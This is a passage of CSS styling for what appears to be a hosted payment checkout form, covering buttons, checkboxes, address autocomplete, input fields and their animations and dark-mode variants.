            opacity: 0;
            -webkit-transform: translateX(16px);
            -ms-transform: translateX(16px);
            transform: translateX(16px);
        }

        .SubmitButton-Text--post {
            opacity: 0;
            -webkit-transform: translateX(-16px);
            -ms-transform: translateX(-16px);
            transform: translateX(-16px);
        }

        .SubmitButton-Icon--post,
        .SubmitButton-Icon--pre {
            opacity: 0;
            -webkit-transform: translateY(-50%) scale(0.9);
            -ms-transform: translateY(-50%) scale(0.9);
            transform: translateY(-50%) scale(0.9);
        }

        .SubmitButton-Icon--current {
            opacity: 1;
        }

        .SubmitButton-Icon--post-center {
            opacity: 1;
            -webkit-transform: translateY(-50%) scale(1.3);
            -ms-transform: translateY(-50%) scale(1.3);
            transform: translateY(-50%) scale(1.3);
            transition-duration: 0.3s;
        }

        .SubmitButton-Icon--post-center.SubmitButton-SpinnerIcon ellipse {
            -webkit-animation: spinner-complete 0.3s ease;
            animation: spinner-complete 0.3s ease;
            -webkit-animation-fill-mode: forwards;
            animation-fill-mode: forwards;
        }

        .SubmitButton-CheckmarkIcon--current path {
            -webkit-animation: checkmark-check 0.3s ease;
            animation: checkmark-check 0.3s ease;
            -webkit-animation-delay: 0.3s;
            animation-delay: 0.3s;
            -webkit-animation-fill-mode: forwards;
            animation-fill-mode: forwards;
        }

        @-webkit-keyframes shimmer-move {
            0% {
                -webkit-transform: translateX(-150%);
                transform: translateX(-150%);
            }
            to {
                -webkit-transform: translateX(150%);
                transform: translateX(150%);
            }
        }

        @keyframes shimmer-move {
            0% {
                -webkit-transform: translateX(-150%);
                transform: translateX(-150%);
            }
            to {
                -webkit-transform: translateX(150%);
                transform: translateX(150%);
            }
        }

        @-webkit-keyframes spinner-spin {
            to {
                -webkit-transform: rotate(1turn);
                transform: rotate(1turn);
            }
        }

        @keyframes spinner-spin {
            to {
                -webkit-transform: rotate(1turn);
                transform: rotate(1turn);
            }
        }

        @-webkit-keyframes spinner-complete {
            to {
                stroke-dashoffset: 0;
            }
        }

        @keyframes spinner-complete {
            to {
                stroke-dashoffset: 0;
            }
        }

        @-webkit-keyframes checkmark-check {
            0% {
                opacity: 0;
                stroke-dashoffset: 30;
            }
            to {
                opacity: 1;
                stroke-dashoffset: 0;
            }
        }

        @keyframes checkmark-check {
            0% {
                opacity: 0;
                stroke-dashoffset: 30;
            }
            to {
                opacity: 1;
                stroke-dashoffset: 0;
            }
        }

        .App-Container.is-squareBordered .SubmitButton {
            border-radius: 0;
        }

        .App-Container.is-veryRoundBordered .SubmitButton {
            border-radius: 22px;
        }

        .SegmentedSelector {
            background-color: #f7f7f7;
            border-radius: 6px;
            border: 1px solid rgba(26, 26, 26, 0.1);
            overflow: hidden;
            padding: 4px;
            position: relative;
            width: 100%;
        }

        .SegmentedSelector-highlight {
            border-radius: 6px;
            left: 0;
            position: absolute;
            top: 4px;
            bottom: 4px;
            transition: width 0.3s ease, -webkit-transform 0.3s ease;
            transition: transform 0.3s ease, width 0.3s ease;
            transition: transform 0.3s ease, width 0.3s ease, -webkit-transform 0.3s ease;
            z-index: 0;
        }

        .SegmentedSelector-label {
            background-color: transparent;
            border-radius: 6px;
            cursor: pointer;
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            font-size: 14px;
            padding: 4px;
            text-align: center;
            z-index: 1;
        }

        .SegmentedSelector-label--selected {
            color: #fff;
            font-weight: 500;
            transition: color 0.3s ease;
        }

        .SegmentedSelector-radio {
            opacity: 0;
            position: fixed;
            width: 0;
        }

        .CheckboxField {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: baseline;
            -webkit-align-items: baseline;
            -ms-flex-align: baseline;
            align-items: baseline;
        }

        .Checkbox-InputContainer {
            margin-right: 12px;
            position: relative;
            top: 4px;
        }

        .Checkbox-StyledInput {
            pointer-events: none;
            background-color: transparent;
            border-radius: 2px;
            box-shadow: 0 0 0 1px #e0e0e0, 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05);
            cursor: pointer;
            display: block;
            height: 16px;
            min-width: 16px;
            transition: box-shadow 0.08s ease-in, color 0.08s ease-in, filter 50000s;
            width: 16px;
        }

        .Checkbox-StyledInput,
        .Checkbox-StyledInput:before {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        .Checkbox-StyledInput:before {
            border: 0;
            border-bottom: 3px solid rgba(26, 26, 26, 0.9);
            border-right: 3px solid rgba(26, 26, 26, 0.9);
            box-sizing: initial;
            content: " ";
            cursor: default;
            display: none;
            height: 14px;
            left: 7px;
            position: absolute;
            top: -5px;
            -webkit-transform-origin: center center;
            -ms-transform-origin: center center;
            transform-origin: center center;
            -webkit-transform: rotate(40deg);
            -ms-transform: rotate(40deg);
            transform: rotate(40deg);
            width: 5px;
        }

        .is-darkMode .Checkbox-StyledInput:before {
            border-bottom-color: hsla(0, 0%, 100%, 0.5);
            border-right-color: hsla(0, 0%, 100%, 0.5);
        }

        .Checkbox-Input {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            background: transparent;
            border: none;
            box-shadow: none;
            height: 16px;
            opacity: 0;
            outline: none;
            position: absolute;
            top: 0;
            width: 16px;
            cursor: pointer;
        }

        .Checkbox-Label {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            cursor: pointer;
        }

        .CheckboxField--disabled .Checkbox-Description,
        .CheckboxField--disabled .Checkbox-Label {
            color: rgba(26, 26, 26, 0.4);
        }

        .CheckboxField--invalid .Checkbox-Description,
        .CheckboxField--invalid .Checkbox-Label {
            color: #dc2727;
        }

        .CheckboxField--disabled .Checkbox-StyledInput,
        .CheckboxField--disabled .Checkbox-StyledInput:before {
            cursor: default;
            pointer-events: none;
        }

        .CheckboxField--disabled .Checkbox-StyledInput:after {
            background: #fff;
            bottom: -1px;
            content: " ";
            left: -1px;
            opacity: 0.5;
            pointer-events: auto;
            position: absolute;
            right: -4px;
            top: -4px;
        }

        .CheckboxField--checked .Checkbox-StyledInput:before {
            display: block;
        }

        .Checkbox-Input:focus ~ .Checkbox-StyledInput {
            box-shadow: 0 0 0 1px rgba(50, 151, 211, 0.3), 0 1px 1px 0 rgba(0, 0, 0, 0.07), 0 0 0 4px rgba(50, 151, 211, 0.3);
            z-index: 2;
        }

        .ClimateContributionSelector {
            border-radius: 6px;
            margin: 24px 8px 8px;
            padding: 0;
            background-color: #f7f7f7;
        }

        .ClimateContributionSelector-container {
            background-color: #fff;
            border-radius: 6px;
        }

        .ClimateContributionSelector-content {
            padding: 12px;
            box-shadow: 0 0 0 1px #e0e0e0, 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05);
            border-radius: 6px;
            overflow: hidden;
        }

        .ClimateContributionSelector-labelDescription {
            margin-top: 8px;
        }

        .ClimateContributionSelector-selectorContainer {
            margin-top: 16px;
            margin-left: 28px;
        }

        .ClimateContributionSelector-info {
            text-align: center;
            line-height: 14px;
            padding-top: 6px;
            padding-bottom: 8px;
        }

        @-webkit-keyframes ClimateProgramBadge-reveal {
            to {
                background-position: -1800px 0;
            }
        }

        @keyframes ClimateProgramBadge-reveal {
            to {
                background-position: -1800px 0;
            }
        }

        @-webkit-keyframes ClimateProgramBadge-loop {
            0% {
                background-position: 0 -24px;
            }
            25% {
                background-position: -3600px -24px;
            }
            to {
                background-position: -3600px -24px;
            }
        }

        @keyframes ClimateProgramBadge-loop {
            0% {
                background-position: 0 -24px;
            }
            25% {
                background-position: -3600px -24px;
            }
            to {
                background-position: -3600px -24px;
            }
        }

        .ClimateProgramBadge-Container {
            padding: 4px;
            margin-bottom: 16px;
        }

        .ClimateProgramBadge-Container:last-child {
            margin-bottom: 0;
        }

        .ClimateProgramBadge-Icon {
            height: 24px;
            margin-top: 4px;
            margin-right: 16px;
            padding: 0 !important;
        }

        .ClimateProgramBadge-IconAnimate {
            width: 24px;
            height: 24px;
            background-size: 3624px 48px;
            background-position: 0 0;
        }

        .ClimateProgramBadge-IconAnimate.is-icon-reveal {
            background-position: 0 0;
            -webkit-animation-name: ClimateProgramBadge-reveal;
            animation-name: ClimateProgramBadge-reveal;
            -webkit-animation-duration: 2.5s;
            animation-duration: 2.5s;
            -webkit-animation-timing-function: steps(75);
            animation-timing-function: steps(75);
            -webkit-animation-fill-mode: forwards;
            animation-fill-mode: forwards;
        }

        .ClimateProgramBadge-IconAnimate.is-icon-loop {
            background-position: 0 -24px;
            -webkit-animation-name: ClimateProgramBadge-loop;
            animation-name: ClimateProgramBadge-loop;
            -webkit-animation-duration: 10s;
            animation-duration: 10s;
            -webkit-animation-timing-function: steps(150);
            animation-timing-function: steps(150);
            -webkit-animation-iteration-count: infinite;
            animation-iteration-count: infinite;
        }

        .BacsDebitGurantee {
            text-align: left;
        }

        .BacsDebitGurantee-bacsIcon {
            width: 90px;
            margin-left: 32px;
            opacity: 0.3;
            -webkit-box-flex: 0;
            -webkit-flex: none;
            -ms-flex: none;
            flex: none;
        }

        .ConfirmTerms {
            line-height: 17px;
            text-align: center;
        }

        .ConfirmTerms .Link {
            white-space: nowrap;
        }

        .ConfirmTerms--setup {
            text-align: left;
        }

        .ConfirmTerms--extraTopSpacing {
            margin-top: 8px;
        }

        .Divider {
            position: relative;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            overflow: hidden;
        }

        .Divider hr {
            width: 100%;
            height: 1px;
            border: none;
            background-color: rgba(26, 26, 26, 0.1);
        }

        .is-darkMode .Divider hr {
            background-color: hsla(0, 0%, 100%, 0.1);
        }

        .Divider-Text {
            position: absolute;
            left: 50%;
            -webkit-transform: translateX(-50%);
            -ms-transform: translateX(-50%);
            transform: translateX(-50%);
            padding: 0 8px;
            white-space: nowrap;
            background-color: #fff;
        }

        .is-darkMode .Divider-Text {
            background-color: #0a0a0a;
        }

        .Notice {
            padding: 12px;
            background-color: rgba(0, 0, 0, 0.03);
            border-radius: 8px;
            overflow: hidden;
        }

        .App-Container.is-squareBordered .Notice,
        .ModalContent--is-squareBordered .Notice {
            border-radius: 0;
        }

        .App-Container.is-veryRoundBordered .Notice,
        .ModalContent--is-veryRoundBordered .Notice {
            border-radius: 18px;
        }

        .Notice--green {
            background-color: #efffed;
        }

        .Notice--yellow {
            background-color: #fefbe7;
        }

        .Notice--red {
            background-color: rgba(220, 39, 39, 0.04);
        }

        .Notice-icon {
            height: 16px;
            min-width: 24px;
            padding-right: 10px;
            color: rgba(0, 0, 0, 0.5);
        }

        .Notice--green .Notice-icon {
            color: #24b47e;
        }

        .Notice--yellow .Notice-icon {
            color: #d97917;
        }

        .Notice--red .Notice-icon {
            color: #dc2727;
        }

        .MobileErrorSummary-container {
            margin-top: 8px;
        }

        .MobileErrorSummary-errorMessageHeading {
            margin-top: -3px;
        }

        .ConfirmPayment-Submit {
            width: 100%;
            margin-top: 16px;
        }

        .ConfirmPayment-PostSubmit {
            margin-top: 12px;
        }

        .ConfirmPayment-PostSubmit > * {
            padding-bottom: 24px;
            margin-bottom: 24px;
            border-bottom: 1px solid rgba(26, 26, 26, 0.1);
        }

        .ConfirmPayment-PostSubmit > :last-child {
            padding-bottom: 0;
            margin-bottom: 0;
            border-bottom: none;
        }

        .ReadOnlyForm {
            background-color: #f7f7f7;
            border-radius: 6px;
            margin: 4px 0 0;
        }

        .ReadOnlyForm .ReadOnlyFormField {
            border-top: 1px solid rgba(26, 26, 26, 0.1);
        }

        .ReadOnlyForm .ReadOnlyFormField:first-child {
            border-top: none;
        }

        .ReadOnlyForm--withShadow {
            overflow: hidden;
            box-shadow: 0 0 0 1px #e0e0e0, 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05);
        }

        .ReadOnlyForm--shadowless {
            box-shadow: 0 0 0 1px #e0e0e0;
        }

        .ReadOnlyForm--topChild {
            border-bottom-right-radius: 0 !important;
            border-bottom-left-radius: 0 !important;
        }

        .App-Container.App-Container.is-veryRoundBordered .ReadOnlyForm {
            border-radius: 18px;
        }

        .App-Container.App-Container.is-squareBordered .ReadOnlyForm {
            border-radius: 0;
        }

        .ReadOnlyFormField {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            padding: 12px;
        }

        .ReadOnlyFormField.is-clickable {
            cursor: pointer;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        .ReadOnlyFormField.is-clickable:hover {
            background: rgba(0, 0, 0, 0.01);
        }

        .ReadOnlyFormField-label {
            width: 30%;
            color: rgba(26, 26, 26, 0.6);
            font-size: 14px;
        }

        .ReadOnlyFormField-titleContainer {
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
        }

        .ReadOnlyFormField-action,
        .ReadOnlyFormField-titleContainer {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
        }

        .ReadOnlyFormField-action {
            -webkit-flex-basis: auto;
            -ms-flex-preferred-size: auto;
            flex-basis: auto;
            -webkit-flex-shrink: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0;
            font-size: 12px;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
        }

        .ReadOnlyFormField-title {
            font-size: 14px;
            color: rgba(26, 26, 26, 0.9);
            text-overflow: ellipsis;
            overflow: hidden;
            white-space: nowrap;
        }

        .ReadOnlyFormField-content {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            min-width: 0;
        }

        .ReadOnlyFormField-description {
            font-size: 14px;
            color: rgba(26, 26, 26, 0.5);
        }

        .ReadOnlyFormField-error {
            border-radius: 6px;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: start;
            -webkit-justify-content: flex-start;
            -ms-flex-pack: start;
            justify-content: flex-start;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            background-color: rgba(220, 39, 39, 0.04);
            padding: 4px 8px;
            margin-top: 8px;
        }

        .ReadOnlyFormField-error,
        .ReadOnlyFormField-error .Text {
            width: -webkit-fit-content;
            width: -moz-fit-content;
            width: fit-content;
        }

        .ReadOnlyFormField-error .Text {
            margin-left: 8px;
            -webkit-flex-basis: auto;
            -ms-flex-preferred-size: auto;
            flex-basis: auto;
        }

        .ReadOnlyFormField-error .Icon {
            -webkit-flex-basis: 12px;
            -ms-flex-preferred-size: 12px;
            flex-basis: 12px;
        }

        .ReadOnlyFormField-additionalContent {
            margin-top: 12px;
        }

        .PromotionalConsentCheckbox {
            margin-top: 8px;
        }

        .PromotionalConsentCheckbox.is-indented {
            padding-left: 8px;
        }

        body:after {
            display: block;
            content: "";
            height: 0;
            width: 100%;
            background: transparent;
            transition: height 0.4s ease;
        }

        body.has-scroll-shim:after {
            height: 80px;
        }

        .InputContainer {
            position: relative;
            display: block;
            margin: 0;
            padding: 0;
        }

        .InputContainer:after {
            height: 0;
            visibility: hidden;
            content: attr(data-max);
        }

        .InputContainer-placeholder--ie {
            pointer-events: none;
            position: absolute;
            top: -100%;
            left: 0;
            opacity: 0;
            color: #bbbbc2;
        }

        .Input--empty + .InputContainer-placeholder--ie {
            top: 0;
            opacity: 1;
        }

        .InputContainer .InputElement {
            position: absolute;
            top: 0;
        }

        .InputContainer .InputElement::-webkit-input-placeholder {
            -webkit-text-fill-color: currentColor;
        }

        .InputContainer .InputElement::-moz-placeholder {
            -webkit-text-fill-color: currentColor;
        }

        .InputContainer .InputElement:-ms-input-placeholder {
            -webkit-text-fill-color: currentColor;
        }

        .InputContainer .InputElement::placeholder {
            -webkit-text-fill-color: currentColor;
        }

        .InputContainer .InputElement::-moz-placeholder {
            color: #000;
        }

        .AutocompleteInput-container {
            position: relative;
        }

        .AutocompleteInput-dropdown-container {
            position: absolute;
            width: 100%;
            top: calc(100% + 8px);
            z-index: 10;
            font-size: 14px;
            line-height: 1.5;
            box-shadow: 0 15px 35px 0 rgba(49, 49, 93, 0.08), 0 5px 15px 0 rgba(0, 0, 0, 0.06);
            border-radius: 6px;
        }

        .AddressAutocomplete-results {
            width: 100%;
            background-color: #fff;
            list-style: none;
            border-radius: 6px;
            box-shadow: 0 0 0 1px #e0e0e0, 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05);
            margin: 0;
            padding: 0;
            overflow: hidden;
        }

        .AddressAutocomplete-manual-entry--inDropdown,
        .AddressAutocomplete-result,
        .AddressAutocomplete-suggestions-container,
        .AddressAutocomplete-tryAgain {
            padding: 8px 12px;
        }

        .AddressAutocomplete-tryAgain {
            color: rgba(26, 26, 26, 0.5);
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
        }

        .AddressAutocomplete-tryAgainLink {
            font-size: 12px;
            color: rgba(26, 26, 26, 0.9);
            line-height: normal;
        }

        .AddressAutocomplete-manual-entry.AddressAutocomplete-manual-entry--inDropdown {
            background-color: rgba(26, 26, 26, 0.05);
            border-radius: 0 0 6px 6px;
            box-shadow: 0 0 0 1px #e0e0e0, 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05);
        }

        .AddressAutocomplete-manual-entry--below-form {
            font-size: 12px;
            margin-top: 8px;
            text-align: left;
            float: left;
        }

        @media only screen and (max-width: 991.98px) {
            .AddressAutocomplete-manual-entry--below-form {
                margin-top: 16px;
            }
        }

        .AddressAutocomplete-manual-entry button {
            margin-right: 8px;
            color: rgba(26, 26, 26, 0.5);
            text-decoration: underline;
        }

        .AddressAutocomplete-manual-entry button:hover,
        .AddressAutocomplete-manual-entry button:visited {
            color: rgba(26, 26, 26, 0.9);
        }

        .AddressAutocomplete-result--less-focus {
            margin-left: 8px;
            font-size: 12px;
            color: rgba(26, 26, 26, 0.5);
        }

        .AddressAutocomplete-result--matched {
            font-size: 14px;
            font-weight: 700;
            color: #1a1a1a;
        }

        .AddressAutocomplete-result--unmatched {
            font-size: 14px;
            color: #1a1a1a;
        }

        .AddressAutocomplete-manual-entry--inDropdown.AddressAutocomplete-manual-entry--selected,
        .AddressAutocomplete-result--selected {
            background-color: rgba(26, 26, 26, 0.1);
        }

        .AddressAutocomplete-result:hover {
            cursor: pointer;
        }

        .AddressAutocomplete-suggestions {
            padding-right: 4px;
        }

        .AddressAutocomplete-suggestions-container {
            font-size: 12px;
            margin: 2px;
            color: rgba(26, 26, 26, 0.5);
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
        }

        .AddressAutocomplete-privacy-logo {
            padding-top: 2px;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-align-self: center;
            -ms-flex-item-align: center;
            align-self: center;
        }

        .AddressAutocomplete--clear-button-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            position: absolute;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            height: 100%;
            bottom: 0;
            right: 8px;
        }

        .AddressAutocomplete--clear-button {
            z-index: 10;
            font-size: 12px;
            padding: 4px 8px;
            border-radius: 2px;
        }

        .AddressAutocomplete--clear-button:focus,
        .AddressAutocomplete-manual-entry--below-form button:focus {
            box-shadow: 0 0 0 1px rgba(50, 151, 211, 0.3), 0 1px 1px 0 rgba(0, 0, 0, 0.07), 0 0 0 4px rgba(50, 151, 211, 0.3);
            outline: none;
        }

        .AddressAutocomplete--clear-dropdown-button {
            position: absolute;
            vertical-align: middle;
            right: 16px;
            top: 12px;
        }

        .AddressAutocomplete-spinner {
            display: none;
            position: absolute;
            height: 12px;
            right: 40px;
            top: 12px;
        }

        .AddressAutocomplete-results--aria-live-region,
        .HiddenInput {
            position: absolute;
            height: 2px;
            width: 2px;
            opacity: 0;
        }

        .HiddenInput {
            z-index: -1;
        }

        .BrandIcon {
            height: 16px;
        }

        .BrandIcon.is-bank {
            height: 18px;
            border-radius: 2.5px;
        }

        .CheckoutInputContainer {
            position: relative;
        }

        .CheckoutInputContainer-placeholderIcon {
            pointer-events: none;
            position: absolute;
            z-index: 3;
            top: calc(50% + 2px);
            left: 12px;
            -webkit-transform: translateY(-50%);
            -ms-transform: translateY(-50%);
            transform: translateY(-50%);
        }

        .CheckoutInputContainer-placeholderIcon svg {
            fill: rgba(26, 26, 26, 0.5);
        }

        .CheckoutInput--hasPlaceholderIcon {
            text-indent: 24px;
        }

        .CheckoutInputContainer--hasMailIcon {
            padding-top: 2px;
        }

        @media only screen and (max-width: 991.98px) {
            .CheckoutInput--hasPhoneNumberCountryCodeSelect {
                top: calc(50% + 1px);
            }
        }

        .CheckoutInput {
            position: relative;
            width: 100%;
            height: 44px;
            padding: 8px 12px;
            color: rgba(26, 26, 26, 0.9);
            font-size: 16px;
            line-height: 1.5;
            border: 0;
            box-shadow: 0 0 0 1px #e0e0e0, 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05);
            transition: box-shadow 0.08s ease-in, color 0.08s ease-in, filter 50000s;
            background: #fff;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        .is-darkMode .CheckoutInput {
            background: linear-gradient(0deg, hsla(0, 0%, 100%, 0.08), hsla(0, 0%, 100%, 0.08)), #000;
            box-shadow: 0 0 0 1px #232323;
            color: #fff;
        }

        .CheckoutInput:-ms-input-placeholder {
            color: rgba(26, 26, 26, 0.5);
        }

        .CheckoutInput::placeholder {
            color: rgba(26, 26, 26, 0.5);
        }

        .CheckoutInput::-webkit-input-placeholder {
            color: rgba(26, 26, 26, 0.5);
        }

        .CheckoutInput::-moz-placeholder {
            color: rgba(26, 26, 26, 0.5);
        }

        .is-fontFamily--Lato .CheckoutInput::-webkit-input-placeholder {
            letter-spacing: 0.35pt;
        }

        .is-fontFamily--Lato .CheckoutInput::-moz-placeholder {
            letter-spacing: 0.35pt;
        }

        .is-fontFamily--Lato .CheckoutInput:-ms-input-placeholder {
            letter-spacing: 0.35pt;
        }

        .is-fontFamily--Lato .CheckoutInput::placeholder {
            letter-spacing: 0.35pt;
        }

        .is-fontFamily--Lora .CheckoutInput::-webkit-input-placeholder {
            letter-spacing: 0.35pt;
        }

        .is-fontFamily--Lora .CheckoutInput::-moz-placeholder {
            letter-spacing: 0.35pt;
        }

        .is-fontFamily--Lora .CheckoutInput:-ms-input-placeholder {
            letter-spacing: 0.35pt;
        }

        .is-fontFamily--Lora .CheckoutInput::placeholder {
            letter-spacing: 0.35pt;
        }

        .is-fontFamily--Inconsolata .CheckoutInput::-webkit-input-placeholder {
            font-size: 15px;
        }

        .is-fontFamily--Inconsolata .CheckoutInput::-moz-placeholder {
            font-size: 15px;
        }

        .is-fontFamily--Inconsolata .CheckoutInput:-ms-input-placeholder {
            font-size: 15px;
        }

        .is-fontFamily--Inconsolata .CheckoutInput::placeholder {
            font-size: 15px;
        }

        .is-fontFamily--PTSans .CheckoutInput::-webkit-input-placeholder {
            font-size: 15px;
        }

        .is-fontFamily--PTSans .CheckoutInput::-moz-placeholder {
            font-size: 15px;
        }

        .is-fontFamily--PTSans .CheckoutInput:-ms-input-placeholder {
            font-size: 15px;
        }

        .is-fontFamily--PTSans .CheckoutInput::placeholder {
            font-size: 15px;
        }

        .is-fontFamily--TitilliumWeb .CheckoutInput::-webkit-input-placeholder {
            font-size: 15px;
        }

        .is-fontFamily--TitilliumWeb .CheckoutInput::-moz-placeholder {
            font-size: 15px;
        }

        .is-fontFamily--TitilliumWeb .CheckoutInput:-ms-input-placeholder {
            font-size: 15px;
        }

        .is-fontFamily--TitilliumWeb .CheckoutInput::placeholder {
            font-size: 15px;
        }

        .is-darkMode .CheckoutInput:-ms-input-placeholder {
            color: hsla(0, 0%, 100%, 0.4);
        }

        .is-darkMode .CheckoutInput::placeholder {
            color: hsla(0, 0%, 100%, 0.4);
        }

        .is-darkMode .CheckoutInput::-webkit-input-placeholder {
            color: hsla(0, 0%, 100%, 0.4);
        }

        .is-darkMode .CheckoutInput::-moz-placeholder {
            color: hsla(0, 0%, 100%, 0.4);
        }

        .CheckoutInput + .InputContainer-placeholder--ie {
            z-index: 2;
            top: 9px;
            left: 12px;
            font-size: 16px;
            color: rgba(26, 26, 26, 0.5);
        }

        .CheckoutInput:focus {
            z-index: 2;
            outline: none;
            box-shadow: 0 0 0 1px rgba(50, 151, 211, 0.3), 0 1px 1px 0 rgba(0, 0, 0, 0.07), 0 0 0 4px rgba(50, 151, 211, 0.3);
        }

        .CheckoutInput--fakeAutofill,
        .CheckoutInput:-webkit-autofill {
            -webkit-text-fill-color: rgba(26, 26, 26, 0.9);
            transition: background-color 100000000s, box-shadow 0s linear;
            box-shadow: 0 0 0 1px #e0e0e0, 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05), inset 0 0 0 1000px #fefbe7;
        }

        .CheckoutInput--fakeAutofill::-webkit-input-placeholder,
        .CheckoutInput:-webkit-autofill::-webkit-input-placeholder {
            -webkit-text-fill-color: rgba(26, 26, 26, 0.5);
        }

        .CheckoutInput--fakeAutofill::placeholder,
        .CheckoutInput:-webkit-autofill::placeholder {
            -webkit-text-fill-color: rgba(26, 26, 26, 0.5);
        }

        .CheckoutInput--fakeAutofill:focus,
        .CheckoutInput:-webkit-autofill:focus {
            transition: box-shadow 0.08s ease-in, color 0.08s ease-in, filter 50000s;
            box-shadow: 0 0 0 1px rgba(50, 151, 211, 0.3), 0 1px 1px 0 rgba(0, 0, 0, 0.07), 0 0 0 4px rgba(50, 151, 211, 0.3), inset 0 0 0 1000px #fefbe7;
        }

        .CheckoutInput:disabled {
            color: rgba(26, 26, 26, 0.4);
            transition: background-color 100000000s, box-shadow 0s linear;
            box-shadow: 0 0 0 1px #e0e0e0, 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05), inset 0 0 0 1000px rgba(26, 26, 26, 0.1);
        }

        .CheckoutInput--fakeAutofill:disabled,
        .CheckoutInput:disabled:-webkit-autofill {
            -webkit-text-fill-color: rgba(26, 26, 26, 0.4);
        }

        .CheckoutInput--invalid {
            z-index: 1;
            color: #dc2727;
            box-shadow: 0 0 0 1px #ef9896, 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05);
        }

        .CheckoutInput--invalid.CheckoutInput--fakeAutofill,
        .CheckoutInput--invalid:-webkit-autofill {
            -webkit-text-fill-color: #dc2727;
            box-shadow: 0 0 0 1px rgba(220, 39, 39, 0.5), 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05), inset 0 0 0 1000px #fefbe7;
        }

        .CheckoutInput--tabularNumbers,
        .CheckoutInput--tabularNumbers + .InputContainer-placeholder--ie {
            font-variant-numeric: tabular-nums;
            letter-spacing: -0.03rem;
        }

        .CheckoutInput::-ms-clear {
            display: none;
        }

        .InputContainer com-1password-op-button {
            display: none !important;
        }

        .App-Container.is-squareBordered .InputContainer .CheckoutInput,
        .ModalContent--is-squareBordered .InputContainer .CheckoutInput {
            border-radius: 0;
        }

        .App-Container.is-veryRoundBordered .InputContainer .CheckoutInput,
        .ModalContent--is-veryRoundBordered .InputContainer .CheckoutInput {
            border-radius: 18px;
        }

        @media only screen and (min-width: 992px) {
            .App-Container:not(.App-Container--setupMode) .CheckoutInput {
                height: 36px;
                font-size: 14px;
                -webkit-transform: rotateY(0);
                transform: rotateY(0);
            }

            .App-Container:not(.App-Container--setupMode) .CheckoutInput + .InputContainer-placeholder--ie {
                font-size: 14px;
            }
        }

        .Select {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            position: relative;
        }

        .Select-source {
            width: 100%;
            height: 44px;
            font-size: 16px;
            padding: 8px 24px 8px 12px;
            color: rgba(26, 26, 26, 0.9);
            line-height: 1.5;
            border: 0;
            background-color: #fff;
            box-shadow: 0 0 0 1px #e0e0e0, 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05);
            transition: box-shadow 0.08s ease-in, color 0.08s ease-in, filter 50000s;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        .is-darkMode .Select-source {
            background: linear-gradient(0deg, hsla(0, 0%, 100%, 0.08), hsla(0, 0%, 100%, 0.08)), #000;
            box-shadow: 0 0 0 1px #232323;
            color: #fff;
        }

        .Select-source--empty {
            color: rgba(26, 26, 26, 0.5);
        }

        .Select-source--empty option {
            color: rgba(26, 26, 26, 0.9);
        }

        .Select-source:focus {
            z-index: 2;
            outline: none;
            box-shadow: 0 0 0 1px rgba(50, 151, 211, 0.3), 0 1px 1px 0 rgba(0, 0, 0, 0.07), 0 0 0 4px rgba(50, 151, 211, 0.3);
        }

        .Select--fakeAutofill .Select-source,
        .Select-source:-webkit-autofill {
            -webkit-text-fill-color: rgba(26, 26, 26, 0.9);
            transition: background-color 100000000s, box-shadow 0s linear;
